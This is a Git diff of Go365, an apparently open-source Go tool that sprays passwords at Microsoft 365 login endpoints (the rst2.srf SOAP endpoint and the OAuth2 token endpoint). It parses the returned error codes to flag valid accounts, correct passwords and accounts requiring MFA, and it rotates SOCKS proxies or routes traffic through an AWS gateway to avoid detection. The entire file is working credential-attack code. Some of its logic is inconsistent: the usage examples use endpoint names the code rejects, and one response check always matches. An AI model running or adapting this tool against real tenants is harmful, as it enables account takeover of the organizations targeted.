@@ -1,24 +1,14 @@
 /*
 Go365
-
 authors: h0useh3ad, paveway3, S4R1N, EatonChips
-
 license: MIT
-
-Copyright 2020 Optiv Inc.
+Copyright 2021 Optiv Inc.
 Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:
 The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.
 THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
 This tool is intended to be used by security professionals that are AUTHORIZED to test the domain targeted by this tool.
-
-needs:
-- Add a pre-test that enumerates the target domain and determines if it is a viable target for this particular endpoint.
-- Error handling in a few areas.
-	e.g... Setting up proxy (e.g. verify proxy server is up, handle timeouts, etc.)
 */
-
 package main
-
 import (
 	"bufio"
 	"bytes"
@@ -30,82 +20,106 @@ import (
 	"os"
 	"strings"
 	"time"
-
+	"encoding/json"
 	"github.com/beevik/etree"
 	"github.com/fatih/color"
 	"golang.org/x/net/proxy"
+	//"crypto/tls"                     uncomment when testing through burp + proxifier
 )
-
 var (
-	targetURL = "https://login.microsoftonline.com/rst2.srf" // keep an eye on this url.
+	targetURL = ""
+	targetURLrst2 = "https://login.microsoftonline.com/rst2.srf"
+	targetURLgraph = "https://login.microsoft.com/common/oauth2/token"
 	debug     = false
 )
-
 const (
-	version = "0.2"
+	version = "1.4"
 	tool    = "Go365"
 	authors = "h0useh3ad, paveway3, S4R1N, EatonChips"
-	usage   = ` Usage:
-     ./Go365 -ul <userlist> -p <password> -d <domain> [OPTIONS]
- Options:
-     -h,            Show this stuff
+	usage   = `Usage:
 
-	 Required:
-     -u string              Username to use
-                              - Username with or without "@domain.com"
-                              (-u legit.user)
-     -ul <file>             Username list to use
-                              - File should contain one username per line
-                              - Usernames can have "@domain.com"
-                              - If no domain is specified, the -d domain is used
-                              (-ul ./usernamelist.txt)
-     -p <string>            Password to attempt
-                              - Enclose in single quotes if it contains special characters
-                              (-p password123  OR  -p 'p@s$w0|2d')
-     -pl <file>            Password list to use
-                              - File should contain one password per line
-                              - Must be used with -delay (delay)
-                              (-pl ./passwordlist.txt)
-     -up <file>            Userpass list to use
-                              - One username and password separated by a ":" per line
-                              - Be careful of duplicate usernames!
-                              (-up ./userpasslist.txt)
-     -d <string>            Domain to test
-                              (-d testdomain.com)
-    
-   Optional:
-     -w <int>              Time to wait between attempts in seconds. 
-                              - Default: 1 second. 5 seconds recommended.
-                              (-w 10)
-     -delay <int>          Delay (in seconds) between sprays when using a password list.
-                              - Default: 10 minutes. 60 minutes (3600 seconds) recommended.
-                              (-delay 600)
-     -o <string>           Output file to write to
-                              - Will append if file exists, otherwise a file is created
-                              (-o ./output.out)
-     -proxy <string>       Single proxy server to use
-                              - IP address and Port separated by a ":"
-                              - Has only been tested using SSH SOCKS5 proxies
-                              (-proxy 127.0.0.1:1080)
-     -proxyfile <string>    A file with a list of proxy servers to use
-                              - IP address and Port separated by a ":" on each line
-                              - Randomly selects a proxy server to use before each request
-                              - Has only been tested using SSH SOCKS5 proxies
-                              (-proxyfile ./proxyfile.txt)
-     -url <string>          Endpoint to send requests to
-                              - Amazon API Gateway 'Invoke URL'
-                              (-url https://k62g98dne3.execute-api.us-east-2.amazonaws.com/login)
-     -debug                 Debug mode.
-                              - Print xml response
+  -h                            Shows this stuff
+
+  Required - Endpoint:   
+
+    -endpoint [rst or graph]    Specify which endpoint to use
+                                : (-endpoint rst)   login.microsoftonline.com/rst2.srf. SOAP XML request with XML response
+                                : (-endpoint graph)  login.microsoft.com/common/oauth2/token. HTTP POST request with JSON Response
+
+  Required - Usernames and Passwords:
+
+    -u <string>                 Single username to test
+                                : Username with or without "@domain.com"
+                                : Must also provide -d flag to specify the domain
+                                : (-u legit.user)
+
+    -ul <file>                  Username list to use (overrides -u)
+                                : File should contain one username per line
+                                : Usernames can have "@domain.com"
+                                : If no domain is specified, the -d domain is used
+                                : (-ul ./usernamelist.txt)
+
+    -p <string>                 Password to attempt
+                                : Enclose in single quotes if it contains special characters
+                                : (-p password123)  or  (-p 'p@s$w0|2d')
+
+    -pl <file>                  Password list to use (overrides -p)
+                                : File should contain one password per line
+                                : -delay flag can be used to include a pause between each set of attempts
+                                : (-pl ./passwordlist.txt)
+
+    -up <file>                  Userpass list to use (overrides all the above options)
+                                : One username and password separated by a ":" per line
+                                : Be careful of duplicate usernames!
+                                : (-up ./userpasslist.txt)
+
+  Required/Optional - Domain:
+
+    -d <string>                 Domain to test
+                                : Use this if the username or username list does not include "@targetcompany.com"
+                                : (-d targetcompany.com)
+
+  Optional:
+
+    -w <int>                    Time to wait between attempts in seconds. 
+                                : Default: 1 second. 5 seconds recommended.
+                                : (-w 10)
+
+    -delay <int>                Delay (in seconds) between sprays when using a password list.
+                                : Default: 60 minutes (3600 seconds) recommended.
+                                : (-delay 7200)
+
+    -o <string>                 Output file to write to
+                                : Will append if file exists, otherwise a file is created
+                                : (-o ./Go365output.out)
+
+    -proxy <string>             Single proxy server to use
+                                : IP address and Port separated by a ":"
+                                : Has only been tested using SSH SOCKS5 proxies
+                                : (-proxy 127.0.0.1:1080)
+
+    -proxyfile <string>         A file with a list of proxy servers to use
+                                : IP address and Port separated by a ":" on each line
+                                : Randomly selects a proxy server to use before each request
+                                : Has only been tested using SSH SOCKS5 proxies
+                                : (-proxyfile ./proxyfile.txt)
+
+    -url <string>               Endpoint to send requests to
+                                : Amazon API Gateway 'Invoke URL'
+                                : Highly recommended that you use this option.
+                                : (-url https://kg98agrae3.execute-api.us-east-2.amazonaws.com/login)
+
+    -debug                      Debug mode.
+                                : Print xml response
 
  Examples:
-   ./Go365 -ul ./user_list.txt -p 'coolpasswordbro!123' -d pwnthisfakedomain.com
-   ./Go365 -ul ./user_list.txt -p 'coolpasswordbro!123' -d pwnthisfakedomain.com -w 5
-   ./Go365 -up ./userpass_list.txt -delay 3600 -d pwnthisfakedomain.com -w 5 -o Go365output.txt
-   ./Go365 -u legituser -p 'coolpasswordbro!123' -d pwnthisfakedomain.com -w 5 -o Go365output.txt -proxy 127.0.0.1:1080
-   ./Go365 -u legituser -pl ./pass_list.txt -delay 1800 -d pwnthisfakedomain.com -w 5 -o Go365output.txt -proxyfile ./proxyfile.txt
-   ./Go365 -ul ./user_list.txt -p 'coolpasswordbro!123' -d pwnthisfakedomain.com -w 5 -o Go365output.txt -url https://k62g98dne3.execute-api.us-east-2.amazonaws.com/login
-`
+  ./Go365 -endpoint msol -ul ./user_list.txt -p 'coolpasswordbro!123' -d pwnthisfakedomain.com
+  ./Go365 -endpoint login -ul ./user_list.txt -p 'coolpasswordbro!123' -d pwnthisfakedomain.com -w 5
+  ./Go365 -endpoint msol -up ./userpass_list.txt -delay 3600 -d pwnthisfakedomain.com -w 5 -o Go365output.txt
+  ./Go365 -endpoint login -u legituser -p 'coolpasswordbro!123' -d pwnthisfakedomain.com -w 5 -o Go365output.txt -proxy 127.0.0.1:1080
+  ./Go365 -endpoint msol -u legituser -pl ./pass_list.txt -delay 1800 -d pwnthisfakedomain.com -w 5 -o Go365output.txt -proxyfile ./proxyfile.txt
+  ./Go365 -endpoint login -ul ./user_list.txt -p 'coolpasswordbro!123' -d pwnthisfakedomain.com -w 5 -o Go365output.txt -url https://k62g98dne3.execute-api.us-east-2.amazonaws.com/login 
+  `
 	banner = `
   ██████         ██████   ██████  ██████
  ██                   ██ ██       ██     
@@ -114,12 +128,12 @@ const (
   ██████   ████  ██████   ██████  ██████
 `
 )
-
+// function to handle wait times
 func wait(wt int) {
 	waitTime := time.Duration(wt) * time.Second
 	time.Sleep(waitTime)
 }
-
+// funtion to randomize the list of proxy servers
 func randomProxy(proxies []string) string {
 	var proxy string
 	if len(proxies) > 0 {
@@ -127,43 +141,70 @@ func randomProxy(proxies []string) string {
 	}
 	return proxy
 }
-
-func doTheStuff(un string, pw string, prox string) (string, color.Attribute) {
+type flagVars struct {
+	flagHelp              bool
+	flagEndpoint          string
+	flagUsername          string
+	flagUsernameFile      string
+	flagDomain            string
+	flagPassword          string
+	flagPasswordFile      string
+	flagUserPassFile      string
+	flagDelay             int
+	flagWaitTime          int
+	flagProxy             string
+	flagProxyFile         string
+	flagOutFilePath       string
+	flagAWSGatewayURL     string
+	flagDebug             bool
+}
+func flagOptions() *flagVars {
+	flagHelp := flag.Bool("h", false, "")
+	flagEndpoint := flag.String("endpoint", "msol", "")
+	flagUsername := flag.String("u", "", "")
+	flagUsernameFile := flag.String("ul", "", "")
+	flagDomain := flag.String("d", "", "")
+	flagPassword := flag.String("p", "", "")
+	flagPasswordFile := flag.String("pl", "", "")
+	flagUserPassFile := flag.String("up", "", "")
+	flagDelay := flag.Int("delay", 3600, "")
+	flagWaitTime := flag.Int("w", 1, "")
+	flagProxy := flag.String("proxy", "", "")
+	flagOutFilePath := flag.String("o", "", "")
+	flagProxyFile := flag.String("proxyfile", "", "")
+	flagAWSGatewayURL := flag.String("url", "", "")
+	flagDebug := flag.Bool("debug", false, "")
+	flag.Parse()
+	return &flagVars{
+		flagHelp:           *flagHelp,
+		flagEndpoint:       *flagEndpoint,
+		flagUsername:       *flagUsername,
+		flagUsernameFile:   *flagUsernameFile,
+		flagDomain:         *flagDomain,
+		flagPassword:       *flagPassword,
+		flagPasswordFile:   *flagPasswordFile,
+		flagUserPassFile:   *flagUserPassFile,
+		flagDelay:          *flagDelay,
+		flagWaitTime:       *flagWaitTime,
+		flagProxy:          *flagProxy,
+		flagProxyFile:      *flagProxyFile,
+		flagOutFilePath:    *flagOutFilePath,
+		flagAWSGatewayURL:  *flagAWSGatewayURL,
+		flagDebug:          *flagDebug,
+	}
+}
+func doTheStuffGraph(un string, pw string, prox string) (string, color.Attribute) {
 	var returnString string
 	var returnColor color.Attribute
-
-	requestBody := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
-	<S:Envelope xmlns:S="http://www.w3.org/2003/05/soap-envelope" xmlns:wsse="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd" xmlns:wsp="http://schemas.xmlsoap.org/ws/2004/09/policy" xmlns:wsu="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:wst="http://schemas.xmlsoap.org/ws/2005/02/trust">
-	    <S:Header>
-	    <wsa:Action S:mustUnderstand="1">http://schemas.xmlsoap.org/ws/2005/02/trust/RST/Issue</wsa:Action>
-	    <wsa:To S:mustUnderstand="1">https://login.microsoftonline.com/rst2.srf</wsa:To>
-	    <ps:AuthInfo xmlns:ps="http://schemas.microsoft.com/LiveID/SoapServices/v1" Id="PPAuthInfo">
-	        <ps:BinaryVersion>5</ps:BinaryVersion>
-	        <ps:HostingApp>Managed IDCRL</ps:HostingApp>
-	    </ps:AuthInfo>
-	    <wsse:Security>
-	    <wsse:UsernameToken wsu:Id="user">
-	        <wsse:Username>` + un + `</wsse:Username>
-	        <wsse:Password>` + pw + `</wsse:Password>
-	    </wsse:UsernameToken>
-	</wsse:Security>
-	    </S:Header>
-	    <S:Body>
-	    <wst:RequestSecurityToken xmlns:wst="http://schemas.xmlsoap.org/ws/2005/02/trust" Id="RST0">
-	        <wst:RequestType>http://schemas.xmlsoap.org/ws/2005/02/trust/Issue</wst:RequestType>
-	        <wsp:AppliesTo>
-	        <wsa:EndpointReference>
-	            <wsa:Address>online.lync.com</wsa:Address>
-	        </wsa:EndpointReference>
-	        </wsp:AppliesTo>
-	        <wsp:PolicyReference URI="MBI"></wsp:PolicyReference>
-	    </wst:RequestSecurityToken>
-	    </S:Body>
-	</S:Envelope>`)
-
 	client := &http.Client{}
-
-	// Set proxy if used
+	// Devs - uncomment this code if you want to proxy through burp + proxifier
+	//client := &http.Client{
+	//	Transport: &http.Transport{
+	//		TLSClientConfig: &tls.Config{InsecureSkipVerify:true},
+	//	},
+	//}
+	requestBody := fmt.Sprintf(`grant_type=password&password=` + pw + `&client_id=4345a7b9-9a63-4910-a426-35363201d503&username=` + un + `&resource=https://graph.windows.net&client_info=1&scope=openid`)
+	// If a proxy was set, do this stuff
 	if prox != "" {
 		dialSOCKSProxy, err := proxy.SOCKS5("tcp", prox, nil, proxy.Direct)
 		if err != nil {
@@ -175,150 +216,180 @@ func doTheStuff(un string, pw string, prox string) (string, color.Attribute) {
 			Timeout:   15 * time.Second,
 		}
 	}
-
 	// Build http request
 	request, err := http.NewRequest("POST", targetURL, bytes.NewBuffer([]byte(requestBody)))
 	request.Header.Add("User-Agent", "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)")
 	if err != nil {
 		panic(err)
 	}
-
 	// Send http request
 	response, err := client.Do(request)
 	if err != nil {
+		color.Set(color.FgRed)
+		fmt.Println("[!] Could not connect to microsoftonline.com\n")
+		fmt.Println("[!] Debug info below:")
+		color.Unset()
 		panic(err)
 	}
 	defer response.Body.Close()
-
 	// Read response
 	body, err := ioutil.ReadAll(response.Body)
 	if err != nil {
 		print(err)
 	}
+	var data map[string]interface{}
+	if err := json.Unmarshal([]byte(body), &data); err != nil {
+		panic(err)
+	}
+	jsonErrCode := data["error_codes"]
+	x := fmt.Sprintf("%v", jsonErrCode)
 
+	if strings.Contains(x, "50059") {
+		fmt.Println(color.RedString("[login] [-] Domain not found in o365 directory. Exiting..."))
+		os.Exit(0) // no need to continue if the domain isn't found
+	} else if strings.Contains(x, "50034") {
+		returnString = "[login] [-] User not found: " + un
+		returnColor = color.FgRed
+	} else if strings.Contains(x, "50126") {
+		returnString = "[login] [-] Valid user, but invalid password: " + un + " : " + pw
+		returnColor = color.FgYellow
+	} else if strings.Contains(x, "50055") {
+		returnString = "[login] [!] Valid user, expired password: " + un + " : " + pw
+		returnColor = color.FgMagenta
+	} else if strings.Contains(x, "50056") {
+		returnString = "[login] [!] User exists, but unable to determine if the password is correct: " + un + " : " + pw
+		returnColor = color.FgYellow
+	} else if strings.Contains(x, "50053") {
+		returnString = "[login] [-] Account locked out: " + un
+		returnColor = color.FgMagenta
+	} else if strings.Contains(x, "50057") {
+		returnString = "[login] [-] Account disabled: " + un
+		returnColor = color.FgMagenta
+	} else if strings.Contains(x, "50076") || strings.Contains(x, "50079") {
+		returnString = "[login] [+] Possible valid login, MFA required. " + un + " : " + pw
+		returnColor = color.FgGreen
+	} else if strings.Contains(x, "53004") {
+		returnString = "[login] [+] Possible valid login, user must enroll in MFA. " + un + " : " + pw
+		returnColor = color.FgGreen
+	} else if strings.Contains(x, "") {
+		returnString = "[login] [+] Possible valid login! " + un + " : " + pw
+		returnColor = color.FgGreen
+	} else {
+		returnString = "[login] [!] Unknown response, run with -debug flag for more information. " + un + " : " + pw
+		returnColor = color.FgMagenta
+	}
+	if debug {
+		returnString = returnString + "\nDebug: " + string(body)
+	}
+	return returnString, returnColor
+}
+func doTheStuffRst(un string, pw string, prox string) (string, color.Attribute) {
+	var returnString string
+	var returnColor color.Attribute
+	requestBody := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?><S:Envelope xmlns:S="http://www.w3.org/2003/05/soap-envelope" xmlns:wsse="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd" xmlns:wsp="http://schemas.xmlsoap.org/ws/2004/09/policy" xmlns:wsu="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:wst="http://schemas.xmlsoap.org/ws/2005/02/trust"><S:Header><wsa:Action S:mustUnderstand="1">http://schemas.xmlsoap.org/ws/2005/02/trust/RST/Issue</wsa:Action><wsa:To S:mustUnderstand="1">https://login.microsoftonline.com/rst2.srf</wsa:To><ps:AuthInfo xmlns:ps="http://schemas.microsoft.com/LiveID/SoapServices/v1" Id="PPAuthInfo"><ps:BinaryVersion>5</ps:BinaryVersion><ps:HostingApp>Managed IDCRL</ps:HostingApp></ps:AuthInfo><wsse:Security><wsse:UsernameToken wsu:Id="user"><wsse:Username>` + un + `</wsse:Username><wsse:Password>` + pw + `</wsse:Password></wsse:UsernameToken></wsse:Security></S:Header><S:Body><wst:RequestSecurityToken xmlns:wst="http://schemas.xmlsoap.org/ws/2005/02/trust" Id="RST0"><wst:RequestType>http://schemas.xmlsoap.org/ws/2005/02/trust/Issue</wst:RequestType><wsp:AppliesTo><wsa:EndpointReference><wsa:Address>online.lync.com</wsa:Address></wsa:EndpointReference></wsp:AppliesTo><wsp:PolicyReference URI="MBI"></wsp:PolicyReference></wst:RequestSecurityToken></S:Body></S:Envelope>`)
+	client := &http.Client{}
+	// Devs - uncomment this code if you want to proxy through burp for troubleshooting
+	//client := &http.Client{
+	//	Transport: &http.Transport{
+	//		TLSClientConfig: &tls.Config{InsecureSkipVerify:true},
+	//	},
+	//}
+	// Build http request
+	request, err := http.NewRequest("POST", targetURL, bytes.NewBuffer([]byte(requestBody)))
+	request.Header.Add("User-Agent", "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)")
+	if err != nil {
+		panic(err)
+	}
+	// Set proxy if enabled
+	if prox != "" {
+		dialSOCKSProxy, err := proxy.SOCKS5("tcp", prox, nil, proxy.Direct)
+		if err != nil {
+			fmt.Println("Error connecting to proxy.")
+		}
+		tr := &http.Transport{Dial: dialSOCKSProxy.Dial}
+		client = &http.Client{
+			Transport: tr,
+			Timeout:   15 * time.Second,
+		}
+	}
+	// Send http request
+	response, err := client.Do(request)
+	if err != nil {
+		color.Set(color.FgRed)
+		fmt.Println("[!] Could not connect to microsoftonline.com\n")
+		fmt.Println("[!] Debug info below:")
+		color.Unset()
+		panic(err)
+	}
+	defer response.Body.Close()
+	// Read response
+	body, err := ioutil.ReadAll(response.Body)
+	if err != nil {
+		print(err)
+	}
 	// Parse response
 	xmlResponse := etree.NewDocument()
 	xmlResponse.ReadFromBytes(body)
-
-	// Read response codes
+	//// Read response codes
+     // looks for the "psf:text" field within the XML response 
 	x := xmlResponse.FindElement("//psf:text")
 	if x == nil {
-		returnString = color.GreenString("[+] Possible valid login! " + un + " : " + pw)
+		returnString = color.GreenString("[msol] [+] Possible valid login! " + un + " : " + pw)
+		// if the "psf:text" field doesn't exist, that means no AADSTS error code was returned indicating a valid login
 	} else if strings.Contains(x.Text(), "AADSTS50059") {
-		fmt.Println(color.RedString("[-] Domain not found in o365 directory. Exiting..."))
+		// if the domain is not in the directory then exit 
+		fmt.Println(color.RedString("[msol] [-] Domain not found in o365 directory. Exiting..."))
 		os.Exit(0) // no need to continue if the domain isn't found
 	} else if strings.Contains(x.Text(), "AADSTS50034") {
-		returnString = "[-] User not found: " + un
+		returnString = "[msol] [-] User not found: " + un
 		returnColor = color.FgRed
 	} else if strings.Contains(x.Text(), "AADSTS50126") {
-		returnString = "[-] Valid user, but invalid password: " + un + " : " + pw
+		returnString = "[msol] [-] Valid user, but invalid password: " + un + " : " + pw
 		returnColor = color.FgYellow
 	} else if strings.Contains(x.Text(), "AADSTS50055") {
-		returnString = "[!] Valid user, expired password: " + un + " : " + pw
+		returnString = "[msol] [!] Valid user, expired password: " + un + " : " + pw
 		returnColor = color.FgMagenta
 	} else if strings.Contains(x.Text(), "AADSTS50056") {
-		returnString = "[!] User exists, but unable to determine if the password is correct: " + un + " : " + pw
+		returnString = "[msol] [!] User exists, but unable to determine if the password is correct: " + un + " : " + pw
 		returnColor = color.FgYellow
 	} else if strings.Contains(x.Text(), "AADSTS50053") {
-		returnString = "[-] Account locked out: " + un
+		returnString = "[msol] [-] Account locked out: " + un
 		returnColor = color.FgMagenta
 	} else if strings.Contains(x.Text(), "AADSTS50057") {
-		returnString = "[-] Account disabled: " + un
+		returnString = "[msol] [-] Account disabled: " + un
 		returnColor = color.FgMagenta
 	} else if strings.Contains(x.Text(), "AADSTS50076") || strings.Contains(x.Text(), "AADSTS50079") {
-		returnString = "[+] Possible valid login, MFA required. " + un + " : " + pw
+		returnString = "[msol] [+] Possible valid login, MFA required. " + un + " : " + pw
 		returnColor = color.FgGreen
 	} else if strings.Contains(x.Text(), "AADSTS53004") {
-		returnString = "[+] Possible valid login, user must enroll in MFA. " + un + " : " + pw
+		returnString = "[msol] [+] Possible valid login, user must enroll in MFA. " + un + " : " + pw
 		returnColor = color.FgGreen
 	} else {
-		returnString = "[!] Unknown response, run with -debug flag for more information. " + un + " : " + pw
+		returnString = "[msol] [!] Unknown response, run with -debug flag for more information. " + un + " : " + pw
 		returnColor = color.FgMagenta
 	}
-
 	if debug {
 		returnString = returnString + "\n" + x.Text() + "\n" + string(body)
 	}
-
 	return returnString, returnColor
 }
-
-type flagVars struct {
-	flagHelp         bool
-	flagUsername     string
-	flagUsernameFile string
-	flagDomain       string
-	flagPassword     string
-	flagPasswordFile string
-	flagUserPassFile string
-	flagDelay        int
-	flagWaitTime     int
-	flagProxy        string
-	flagProxyFile    string
-	flagOutFilePath  string
-	flagTargetURL    string
-	flagDebug        bool
-}
-
-func flagOptions() *flagVars {
-	flagHelp := flag.Bool("h", false, "")
-	flagUsername := flag.String("u", "", "")
-	flagUsernameFile := flag.String("ul", "", "")
-	flagDomain := flag.String("d", "", "")
-	flagPassword := flag.String("p", "", "")
-	flagPasswordFile := flag.String("pl", "", "")
-	flagUserPassFile := flag.String("up", "", "")
-	flagDelay := flag.Int("delay", 600, "")
-	flagWaitTime := flag.Int("w", 1, "")
-	flagProxy := flag.String("proxy", "", "")
-	flagOutFilePath := flag.String("o", "", "")
-	flagProxyFile := flag.String("proxyfile", "", "")
-	flagTargetURL := flag.String("url", targetURL, "")
-	flagDebug := flag.Bool("debug", false, "")
-
-	flag.Parse()
-
-	return &flagVars{
-		flagHelp:         *flagHelp,
-		flagUsername:     *flagUsername,
-		flagUsernameFile: *flagUsernameFile,
-		flagDomain:       *flagDomain,
-		flagPassword:     *flagPassword,
-		flagPasswordFile: *flagPasswordFile,
-		flagUserPassFile: *flagUserPassFile,
-		flagDelay:        *flagDelay,
-		flagWaitTime:     *flagWaitTime,
-		flagProxy:        *flagProxy,
-		flagProxyFile:    *flagProxyFile,
-		flagOutFilePath:  *flagOutFilePath,
-		flagTargetURL:    *flagTargetURL,
-		flagDebug:        *flagDebug,
-	}
-}
-
 func main() {
-
 	fmt.Println(color.BlueString(banner))
 	fmt.Println(color.RedString(" Version: ") + version)
 	fmt.Println(color.RedString(" Authors: ") + authors + "\n")
-	fmt.Println(" This tool is currently in development.\n")
-
 	var domain string
 	var proxyList []string
 	var usernameList []string
 	var passwordList []string
 	var outFile *os.File
 	var err error
-
 	rand.Seed(time.Now().UnixNano())
 	opt := flagOptions()
-
 	//-h
 	if opt.flagHelp {
 		fmt.Printf("%s\n", usage)
 		os.Exit(0)
 	}
-
 	// -u
 	if opt.flagUsername != "" {
 		usernameList = append(usernameList, opt.flagUsername)
@@ -327,7 +398,6 @@ func main() {
 		fmt.Println(color.RedString("Must provide a user. E.g. -u legituser, -ul ./user_list.txt, -up ./userpass_list.txt"))
 		os.Exit(0)
 	}
-
 	// -ul
 	if opt.flagUsernameFile != "" {
 		// Open username file
@@ -346,7 +416,6 @@ func main() {
 			panic(err)
 		}
 	}
-
 	// -p
 	if opt.flagPassword != "" {
 		passwordList = append(passwordList, opt.flagPassword)
@@ -355,7 +424,6 @@ func main() {
 		fmt.Println(color.RedString("Must provide a password to test. E.g. -p 'password123!', -pl ./password_list.txt, -up ./userpass_list.txt"))
 		os.Exit(0)
 	}
-
 	// -pl
 	if opt.flagPasswordFile != "" {
 		// Open password file
@@ -374,7 +442,6 @@ func main() {
 			panic(err)
 		}
 	}
-
 	// -up
 	if opt.flagUserPassFile != "" {
 		// Open userpass file
@@ -397,7 +464,6 @@ func main() {
 			panic(err)
 		}
 	}
-
 	// -d
 	if opt.flagDomain != "" {
 		domain = fmt.Sprintf("@" + opt.flagDomain)
@@ -406,14 +472,12 @@ func main() {
 		fmt.Println(color.RedString("Must provide a domain. E.g. -d testdomain.com"))
 		os.Exit(0)
 	}
-
 	// -proxy
 	if opt.flagProxy != "" {
 		proxyList = append(proxyList, opt.flagProxy)
 
 		fmt.Println(color.GreenString("[!] Optional proxy configured: " + opt.flagProxy))
 	}
-
 	// -proxyfile
 	if opt.flagProxyFile != "" {
 		proxyFile, err := os.Open(opt.flagProxyFile)
@@ -429,10 +493,8 @@ func main() {
 		if err := scanner.Err(); err != nil {
 			panic(err)
 		}
-
 		fmt.Println(color.GreenString("[!] Optional proxy file configured: " + opt.flagProxyFile))
 	}
-
 	// -o
 	if opt.flagOutFilePath != "" {
 		outFile, err = os.OpenFile(opt.flagOutFilePath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
@@ -443,13 +505,40 @@ func main() {
 
 		outFile.WriteString(strings.Join(os.Args, " ") + "\n")
 	}
-
 	// -url
-	targetURL = opt.flagTargetURL
-
+	if opt.flagAWSGatewayURL != "" {
+		targetURL = opt.flagAWSGatewayURL
+		resp, err := http.Get(targetURL)
+		if err != nil {
+			color.Set(color.FgRed)
+			fmt.Println("[!] Could not connect to AWS Gateway link provided: " + targetURL + "\n")
+			fmt.Println("[!] Debug info below:")
+			color.Unset()
+			panic(err)
+		} else {
+			color.Set(color.FgGreen)
+			fmt.Println("[!] Optional AWS Gateway configured: " + targetURL + "\n")
+			color.Unset()
+			_ = resp
+		}
+	}
+	// -endpoint
+	if opt.flagEndpoint == "rst"{
+		fmt.Println("Using the classic flavor of go365...")
+		fmt.Println("If you're using an AWS Gateway, make sure it is pointing to https://login.microsoftonline.com/rst2.srf")
+		targetURL = targetURLrst2
+	} else if opt.flagEndpoint == "graph" {
+		targetURL = targetURLgraph
+		fmt.Println("using login.microsoft.com")
+		fmt.Println("If you're using an AWS Gateway, make sure it is pointing to https://login.microsoft.com/common/oauth2/token ")
+	} else {
+		fmt.Println("Specify an endpoint (-endpoint rst, or -endpoint graph")
+		fmt.Printf("%s\n", usage)
+		os.Exit(0)
+	}
 	// -debug
 	debug = opt.flagDebug
-
+	//// Finally it starts happening
 	// Iterate through passwords
 	for i, pass := range passwordList {
 		// Iterate through usernames
@@ -458,42 +547,59 @@ func main() {
 			if !strings.Contains(user, "@") {
 				user = user + domain
 			}
-
 			// If using userpass file, use corresponding password
 			if opt.flagUserPassFile != "" {
 				pass = passwordList[j]
 			}
-
+			result := ""
 			// Test username:password combo
-			result, col := doTheStuff(user, pass, randomProxy(proxyList))
-
-			// Print with color
-			color.Set(col)
-			fmt.Println(result)
-			color.Unset()
-
+			if opt.flagEndpoint == "rst" {
+				result, col := doTheStuffRst(user, pass, randomProxy(proxyList))
+				// Print with color
+				color.Set(col)
+				fmt.Println(result)
+				color.Unset()
+				// Write to file
+				if opt.flagOutFilePath != "" {
+					outFile.WriteString(result + "\n")
+				}
+				// Wait between usernames
+				if j < len(usernameList)-1 {
+					wait(opt.flagWaitTime)
+				}
+			} else if opt.flagEndpoint == "graph" {
+				result, col := doTheStuffGraph(user, pass, randomProxy(proxyList))
+				// Print with color
+				color.Set(col)
+				fmt.Println(result)
+				color.Unset()
+				// Write to file
+				if opt.flagOutFilePath != "" {
+					outFile.WriteString(result + "\n")
+				}	
+				// Wait between usernames
+				if j < len(usernameList)-1 {
+					wait(opt.flagWaitTime)
+				}
+			}
 			// Write to file
 			if opt.flagOutFilePath != "" {
 				outFile.WriteString(result + "\n")
 			}
-
 			// Wait between usernames
 			if j < len(usernameList)-1 {
 				wait(opt.flagWaitTime)
 			}
 		}
-
 		// If using userpass file, exit loop
 		if opt.flagUserPassFile != "" {
 			break
 		}
-
 		// Wait between passwords
 		if i < len(passwordList)-1 {
 			wait(opt.flagDelay)
 		}
 	}
-
 	// Remind user of output file
 	if opt.flagOutFilePath != "" {
 		fmt.Println(color.GreenString("[!] Output file located at: " + opt.flagOutFilePath))
